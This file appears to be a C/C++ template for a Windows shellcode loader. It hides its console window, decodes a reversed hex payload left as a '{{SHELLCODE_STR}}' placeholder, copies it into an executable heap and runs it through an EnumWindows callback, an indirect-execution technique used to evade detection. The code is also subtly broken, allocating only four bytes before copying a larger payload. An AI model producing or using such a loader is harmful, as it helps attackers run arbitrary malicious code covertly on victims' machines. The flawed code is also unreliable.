#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#include <string.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

unsigned int FormatCode(char* array) {
	_strrev(array);
	unsigned int char_in_hex;
	unsigned int iterations = strlen(array);
	unsigned int memory_allocation = strlen(array) / 2;
	for (unsigned int i = 0; i < iterations - 1; i++) {
		sscanf_s(array + 2 * i, "%2X", &char_in_hex);
		array[i] = (char)char_in_hex;
	}
	return memory_allocation;
}

void hardCodeM() {
	char array[] = "{{SHELLCODE_STR}}";
	unsigned int memory_allocation = FormatCode(array);

	//heap
	LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	LPVOID ptr = HeapAlloc(heapp, 0, sizeof(memory_allocation));

	RtlMoveMemory(ptr, array, memory_allocation);

	//callback
    ::EnumWindows((WNDENUMPROC)ptr, NULL);
}


//
// Main function
//
int main() {
	hardCodeM();
}